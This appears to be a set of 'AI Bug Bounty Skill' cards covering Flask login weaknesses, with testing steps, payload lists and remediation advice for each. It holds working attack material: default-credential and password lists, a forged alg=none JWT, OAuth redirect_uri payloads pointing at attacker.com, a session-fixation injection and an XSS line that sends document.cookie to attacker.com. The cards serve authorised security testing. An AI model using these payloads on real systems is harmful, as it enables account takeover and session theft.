```markdown
# 🔑 Flask Login Form – Default Credentials – AI Bug Bounty Skill

## Skill Name
`flask-default-creds-login`

## Description
Detects and exploits unchanged default credentials in Flask authentication forms. Many frameworks, libraries, or deployment scripts create default user accounts (e.g., `admin/admin`, `flask/flask`) that administrators forget to disable or change. Attackers can easily authenticate with known credentials and gain immediate access, often with administrative rights.

## Affected Components
- Database seeding scripts (`seed.py`, `init_db.py`) inserting default users.
- Configuration files (`config.py`, `.env.example`) documenting default logins.
- Flask extensions (Flask-Admin, Flask-Security) with built‑in default accounts.
- Docker images or quick‑start guides that set `ADMIN_PASSWORD=admin`.

## Detection Patterns
- **Heuristic**: Publicly available default credential lists that succeed on the login endpoint.
- **Dynamic test**: Try `admin:admin`, `admin:password`, `flask:flask`, `root:toor`. If login succeeds, default credentials are active.

## Testing Methodology
1. Collect common default usernames/passwords for Flask and Python web apps.
2. Submit them via POST to `/login`.
3. If rate limiting is absent, brute‑force quickly.
4. After login, check the user's role (often `admin`).

## Essential Payloads
```
admin:admin
admin:password
admin:admin123
admin:changeme
flask:flask
python:python
root:root
root:toor
user:user
test:test
guest:guest
```

## Secure Coding
- Remove all default accounts before production.
- Enforce password change on first login for any initial accounts.
- Never hardcode credentials in configuration files or source.
- Use environment variables with strong random passwords.

## Output Format
```
Title: Default Credentials Active on Login Form
Severity: Critical
Proof of Concept: curl -X POST /login -d "username=admin&password=admin" → success
Remediation: Disable or change default account passwords; enforce password complexity.
```
```

```markdown
# ⏱️ Flask Login Form – Missing Rate Limiting – AI Bug Bounty Skill

## Skill Name
`flask-no-rate-limit-login`

## Description
Identifies login endpoints lacking rate limiting, allowing unlimited brute‑force attacks. Without throttling, an attacker can enumerate usernames, test thousands of passwords, and compromise accounts. This weakness is often chained with weak password policies or user enumeration.

## Affected Components
- Login route without Flask-Limiter or similar extension.
- Absence of account lockout after N failed attempts.
- No CAPTCHA after repeated failures.
- Server‑side logging only, no active blocking.

## Detection Patterns
- **Heuristic**: No `X-RateLimit-*` headers; repeated requests succeed with `200` or `401` without delays.
- **Dynamic test**: Send 50 rapid login attempts with wrong passwords; observe if all are processed without increasing delays or 429 responses.

## Testing Methodology
1. Send 10‑20 login requests in quick succession (using Burp Intruder or Python script).
2. Check for `429 Too Many Requests`, `Retry-After` header, or temporary lockout messages.
3. If none appear, brute‑force is possible.

## Essential Payloads
- Username list + common password list.
- Time‑based delays may indicate soft limiting, but if none, full brute‑force.

## Secure Coding
- Implement Flask-Limiter with a sensible rate limit (e.g., 5 attempts per minute per IP/account).
- Introduce progressive delays (exponential backoff).
- Lock accounts after X failures (with unlock mechanism).
- Use CAPTCHA after repeated failures.

## Output Format
```
Title: No Rate Limiting on Login Form
Severity: Medium
Proof of Concept: 50 rapid login attempts all returned 401, no lockout.
Remediation: Implement rate limiting with Flask-Limiter and account lockout policy.
```
```

```markdown
# 🚫 Flask Login Form – Weak Password Policy – AI Bug Bounty Skill

## Skill Name
`flask-weak-password-login`

## Description
Evaluates the login form’s reliance on weak user passwords. If the application does not enforce password complexity (minimum length, mix of characters), users may choose easily guessable passwords. Combined with no rate limiting, this allows credential brute‑forcing.

## Affected Components
- Registration / password change endpoints that accept short or common passwords.
- Password validation logic that only checks length > 1.
- No check against common password lists (e.g., "password", "123456").

## Detection Patterns
- **Dynamic test**: Register a new user with password `123`; if accepted, policy is weak.
- Check if password change allows `password` as new password.

## Testing Methodology
1. Create an account with password `123456`. If successful, weak policy.
2. Attempt brute‑force on known usernames with top 100 passwords.
3. Use leaked password lists to see if common passwords work.

## Essential Payloads
- Password list: `123456`, `password`, `qwerty`, `admin`, `letmein`, `welcome`.

## Secure Coding
- Enforce minimum length ≥ 8, require uppercase, lowercase, digit, special character.
- Check password against known breached passwords (e.g., Have I Been Pwned API).
- Educate users about strong passwords.
- Use `zxcvbn` library for password strength estimation.

## Output Format
```
Title: Weak Password Policy Allows Guessable Passwords
Severity: Medium
Proof of Concept: Registered user with password "123456" – accepted.
Remediation: Implement password complexity rules and forbidden‑password list.
```
```

```markdown
# 👤 Flask Login Form – User Enumeration – AI Bug Bounty Skill

## Skill Name
`flask-user-enum-login`

## Description
Detects differences in server responses that reveal whether a username/email exists. This allows attackers to compile a list of valid users for credential brute‑forcing, phishing, or targeted account takeover.

## Affected Components
- Login endpoint returning distinct messages: “User not found” vs. “Incorrect password”.
- Password reset flow that says “Email sent” only for registered users.
- Registration form that says “Username already taken”.
- Timing differences in response for valid vs. invalid users (side‑channel).

## Detection Patterns
- **Dynamic test**: Send login with known‑bad username and a valid one; compare responses.
- Check password reset: submit valid email and invalid email; observe differences in messages, status codes, or timing.

## Testing Methodology
1. Try login with `nonexistent_user` / random password → note message.
2. Try login with known `admin` / wrong password → note message.
3. If messages differ (e.g., “No user” vs. “Wrong password”), enumeration confirmed.
4. For password reset, request reset for two emails; look for variations.

## Essential Payloads
- Username wordlist (common admin names, employee names).
- Automated script measuring response length and time.

## Secure Coding
- Use identical, generic error messages for all login failures: “Invalid username or password”.
- For password reset, always show a generic message like “If that account exists, an email has been sent.”
- Ensure consistent response times (add random delay if necessary).
- Do not reveal user existence via API responses.

## Output Format
```
Title: User Enumeration via Login Error Message
Severity: Medium
Proof of Concept: Request with invalid username → “User not found”; request with valid username → “Wrong password”.
Remediation: Return identical error messages for all authentication failures.
```
```

```markdown
# 🔄 Flask Login Form – Account Takeover via Password Reset – AI Bug Bounty Skill

## Skill Name
`flask-account-takeover-pwreset`

## Description
Exploits flaws in the password reset flow to gain unauthorised access to any account. Vulnerabilities include weak tokens, missing token expiration, predictable reset links, IDOR in reset parameters, and lack of rate limiting on reset requests.

## Affected Components
- Password reset token generation using `random.randint()` or time‑based values.
- Reset links containing user ID (e.g., `?user_id=123&token=abc`).
- Reset tokens sent via GET parameters in URL.
- No expiry or reuse of tokens.
- Email address changeable in reset request (parameter pollution).

## Detection Patterns
- **Heuristic**: Reset token is short, numeric, or base64‑encoded sequential value.
- **Dynamic test**: Request two resets for the same account; if tokens are similar or follow a pattern, they are predictable.
- Modify `user_id` in a reset request while using your own valid token – if it resets the victim’s password, IDOR is present.

## Testing Methodology
1. Trigger password reset for own account, capture token.
2. Attempt to reuse token after it's used (should be invalidated).
3. Try to reset another user’s password by changing `user_id` parameter in the POST request (keeping own token).
4. Brute‑force numeric tokens if length is short (e.g., 4‑digit PIN).
5. Check if token can be used multiple times (replay).

## Essential Payloads
- Predictable token: increment a known token value.
- IDOR: `POST /reset-password` with `user_id=victim_id&token=OWN_VALID_TOKEN&new_password=Pass123`.
- Token brute‑force: loop through 0000‑9999.

## Secure Coding
- Generate tokens using `secrets.token_urlsafe()` with sufficient entropy (32 bytes).
- Store token hash in database, bind to user and session, expire in 15‑30 minutes.
- Invalidate after use; do not accept `user_id` from client – derive from token lookup.
- Implement rate limiting on reset requests.
- Send reset link via email only, not in response.

## Output Format
```
Title: Account Takeover via IDOR in Password Reset
Severity: Critical
Proof of Concept: Using own reset token, changed `user_id` to admin’s ID, successfully reset admin password.
Remediation: Associate reset token server‑side with the user; do not trust client‑supplied user identifiers.
```
```

```markdown
# 🪪 Flask Login Form – Session Fixation – AI Bug Bounty Skill

## Skill Name
`flask-session-fixation-login`

## Description
Exploits the failure to regenerate session identifiers after a successful login. An attacker can trick a victim into authenticating with a known session ID, then hijack the now‑authenticated session to access the victim’s account.

## Affected Components
- Flask-Login without session regeneration (`session.clear()` or `session.regenerate()`).
- Session cookie not set to `HttpOnly`/`Secure`/`SameSite` after login.
- Acceptance of session ID via URL parameter (typical in legacy apps).

## Detection Patterns
- **Heuristic**: Session cookie value remains identical before and after login.
- **Dynamic test**: Capture session cookie before login, log in, observe cookie unchanged. Use that pre‑login cookie after logout – if still valid, fixation works.

## Testing Methodology
1. Visit login page, note `Set-Cookie` session value (or get one).
2. Log in; compare session cookie after login with initial one.
3. If identical, session fixation exists.
4. Provide a victim with a URL containing a fixed session ID (if accepted via GET). Once victim logs in, use that ID to access their session.

## Essential Payloads
- URL containing `?session=ATTACKER_SESSION_ID`.
- Inject `<meta http-equiv=Set-Cookie content=sessionid=ATTACKER_ID>` via XSS/HTML injection to fixate.

## Secure Coding
- Always regenerate session ID after login (`session.clear()` + set new session).
- In Flask, `login_user()` does not automatically regenerate; manually call `session.clear()` before `login_user()` or use `flask_security` which handles it.
- Set cookies with `HttpOnly`, `Secure`, `SameSite=Strict`.
- Do not accept session IDs from URL.

## Output Format
```
Title: Session Fixation on Login
Severity: High
Proof of Concept: Pre‑login cookie remains valid after successful authentication.
Remediation: Regenerate session ID upon login and set appropriate cookie flags.
```
```

```markdown
# 🍪 Flask Login Form – Session Hijacking – AI Bug Bounty Skill

## Skill Name
`flask-session-hijack-login`

## Description
Exploits weaknesses that allow an attacker to steal or predict a victim’s session cookie after login. This may occur due to missing `HttpOnly`/`Secure` flags, session leakage via XSS, transmission over HTTP, or predictable session token generation.

## Affected Components
- Session cookies without `HttpOnly` flag (accessible to JavaScript).
- `Secure` flag missing, allowing transmission over unencrypted connections.
- `SameSite` not set, making cross‑site request attacks easier.
- Predictable session ID generation (weak entropy).
- Session ID exposed in URL parameters or logs.

## Detection Patterns
- **Dynamic test**: Inspect `Set-Cookie` header after login: if `HttpOnly` and `Secure` are absent, cookie can be stolen via XSS or MITM.
- Check if session cookie value follows a pattern or is short and guessable.

## Testing Methodology
1. Log in, examine session cookie flags using browser DevTools or curl.
2. If cookie lacks `HttpOnly`, try stealing it via a simple XSS payload (if XSS exists).
3. Sniff network traffic if on HTTP (should be HTTPS).
4. Decode Flask session cookie (it's signed but not encrypted); if sensitive data is inside, it’s a further risk.

## Essential Payloads
- XSS: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
- Check cookie format: if it's a simple hex string of length 16, might be predictable.

## Secure Coding
- Set `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_SAMESITE='Lax'`.
- Use strong, random session secret key.
- Encrypt session data if necessary (Flask default is signed, not encrypted; avoid storing secrets).
- Transmit cookies only over HTTPS.
- Regenerate session ID after login.

## Output Format
```
Title: Session Hijacking via Missing HttpOnly Flag
Severity: High (if chained with XSS)
Proof of Concept: Session cookie set without HttpOnly; can be read via document.cookie.
Remediation: Enable HttpOnly and Secure flags for session cookies.
```
```

```markdown
# 🎫 Flask Login Form – JWT None Algorithm – AI Bug Bounty Skill

## Skill Name
`flask-jwt-none-alg-login`

## Description
Detects whether the JWT authentication mechanism in the login flow accepts tokens signed with the `none` algorithm. An attacker can craft a token with `"alg":"none"` and any payload (e.g., `"sub":"admin"`), removing the signature, and gain unauthorised access.

## Affected Components
- `jwt.decode(token, verify=False)` or missing algorithm verification.
- Libraries like `PyJWT` where `decode()` with `algorithms=None` allows `none`.
- Custom JWT decoding that does not enforce an algorithm.

## Detection Patterns
- **Dynamic test**: Obtain a valid JWT, modify header to `{"alg":"none","typ":"JWT"}`, set payload to admin claims, remove signature (keep trailing dot), and send it. If accepted, vulnerable.

## Testing Methodology
1. Capture a JWT from login response.
2. Decode the original payload; modify `sub` to an admin ID, add `role: admin`.
3. Set header `{"alg":"none"}`; re-encode without signature.
4. Send request to a protected endpoint with the new token. If access granted, none algorithm is accepted.

## Essential Payloads
- Modified token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.` (empty signature)

## Secure Coding
- Always explicitly specify allowed algorithms in `jwt.decode()`: `algorithms=['HS256']`.
- Never accept `none` algorithm.
- Upgrade `PyJWT` to latest version.
- Use strong secrets for HMAC or use asymmetric keys (RS256).

## Output Format
```
Title: JWT None Algorithm Accepted
Severity: Critical
Proof of Concept: Forged JWT with alg=none and admin claims grants access to admin endpoints.
Remediation: Specify allowed algorithms list in jwt.decode() and exclude 'none'.
```
```

```markdown
# 🔓 Flask Login Form – JWT Weak Secret – AI Bug Bounty Skill

## Skill Name
`flask-jwt-weak-secret-login`

## Description
Identifies JSON Web Tokens signed with a weak or default HMAC secret. An attacker can brute‑force the secret offline using tools like `hashcat` or `jwtcrack`, then forge tokens with arbitrary claims to impersonate any user.

## Affected Components
- `jwt.encode(payload, 'secret', algorithm='HS256')` where `'secret'` is guessable.
- Secret derived from a simple pattern, wordlist, or left at default.

## Detection Patterns
- **Dynamic test**: Decode a JWT, if HS256 is used, try brute‑forcing the signature with a password list (e.g., rockyou.txt). If you can find the secret, it's weak.

## Testing Methodology
1. Capture a valid JWT.
2. Use `jwt_tool` or `hashcat` with a wordlist to crack the secret.
3. Once cracked, craft new JWT with elevated privileges and verify it's accepted.

## Essential Payloads
- Wordlists: `rockyou.txt`, common Flask secret keys (`secret`, `mysecret`, `flask`, `changeme`, etc.).

## Secure Coding
- Use a strong, random secret of at least 256 bits.
- Consider switching to RS256 (asymmetric) to avoid shared secret risk.
- Rotate secrets periodically.
- Store secrets securely (environment variables, not source code).

## Output Format
```
Title: JWT Signed with Weak Secret
Severity: High
Proof of Concept: JWT secret cracked using rockyou.txt; forged admin token accepted.
Remediation: Replace with a strong, random secret; use asymmetric keys if possible.
```
```

```markdown
# 🔀 Flask Login Form – OAuth Redirect_URI Hijack – AI Bug Bounty Skill

## Skill Name
`flask-oauth-redirect-hijack-login`

## Description
Exploits misconfigured OAuth2/OpenID redirect_uri validation in Flask login flows. An attacker can manipulate the `redirect_uri` parameter to steal authorisation codes, obtain access tokens, and take over accounts that authenticate via third‑party providers.

## Affected Components
- OAuth login initiation endpoints that accept a user‑controlled `redirect_uri`.
- Flask-Dance, Authlib, or custom OAuth handlers lacking strict URI validation.
- Callback route that does not verify the `redirect_uri` against a whitelist.

## Detection Patterns
- **Dynamic test**: Initiate OAuth login, intercept the request, change `redirect_uri` to an attacker‑controlled domain (e.g., `https://attacker.com/callback`). If the provider redirects to that URI with the code, the validation is flawed.

## Testing Methodology
1. Start the OAuth flow and note the `redirect_uri` parameter.
2. Change it to `http://attacker.com` (or a whitelisted open‑redirect URL) and see if the authorisation code is sent there.
3. If the code leaks, exchange it for a token on the attacker server (if client secret is known or not needed for public clients).
4. For additional impact, try to use a path‑relative URI (`/malicious`) or other variations (`//evil.com`).

## Essential Payloads
- `redirect_uri=https://attacker.com/callback`
- `redirect_uri=https://target.com%40attacker.com` (URL parser confusion)
- `redirect_uri=https://target.com.attacker.com` (subdomain trick)
- Open redirect on the legitimate domain to redirect code externally.

## Secure Coding
- Maintain a strict whitelist of allowed redirect URIs (exact match, no pattern matching).
- Validate `redirect_uri` against the registered callback URL(s) on the server side.
- Do not allow open redirects in the application.
- Use the `state` parameter to prevent CSRF, but it does not prevent redirect hijack.
- For public clients, use PKCE.

## Output Format
```
Title: OAuth Redirect_URI Validation Bypass
Severity: Critical
Proof of Concept: Modified redirect_uri to attacker‑controlled domain; received authorization code, obtained access token.
Remediation: Whitelist redirect URIs exactly and validate on server side.
```
```

```markdown
# 🛡️ Summary – Full List of Flask Login Form Bug Bounty Skills

| # | Vulnerability | Skill Name |
|---|--------------|------------|
| 1 | SQL Injection | `flask-sqli-login-bypass` |
| 2 | Server‑Side Template Injection | `flask-ssti-login` |
| 3 | Cross‑Site Scripting | `flask-xss-login` |
| 4 | Cross‑Site Request Forgery | `flask-csrf-login` |
| 5 | Server‑Side Request Forgery | `flask-ssrf-login` |
| 6 | Local File Inclusion | `flask-lfi-login` |
| 7 | Remote File Inclusion | `flask-rfi-login` |
| 8 | OS Command Injection | `flask-cmd-injection-login` |
| 9 | Insecure Direct Object Reference | `flask-idor-login` |
| 10 | Mass Assignment / Parameter Binding | `flask-mass-assignment-login` |
| 11 | Insecure Deserialization | `flask-insecure-deserialization-login` |
| 12 | Privilege Escalation | `flask-login-privilege-escalation` |
| 13 | Information Disclosure | `flask-info-disclosure-login` |
| 14 | Sensitive Data Exposure | `flask-data-exposure-login` |
| 15 | Debug Mode Enabled | `flask-debug-mode-login` |
| 16 | Stack Trace Information Disclosure | `flask-stack-trace-login` |
| 17 | Directory Listing | `flask-dir-listing-login` |
| 18 | Hardcoded Credentials | `flask-hardcoded-creds-login` |
| 19 | Default Credentials | `flask-default-creds-login` |
| 20 | Missing Rate Limiting | `flask-no-rate-limit-login` |
| 21 | Weak Password Policy | `flask-weak-password-login` |
| 22 | User Enumeration | `flask-user-enum-login` |
| 23 | Account Takeover via Password Reset | `flask-account-takeover-pwreset` |
| 24 | Session Fixation | `flask-session-fixation-login` |
| 25 | Session Hijacking | `flask-session-hijack-login` |
| 26 | JWT None Algorithm | `flask-jwt-none-alg-login` |
| 27 | JWT Weak Secret | `flask-jwt-weak-secret-login` |
| 28 | OAuth Redirect_URI Hijack | `flask-oauth-redirect-hijack-login` |
```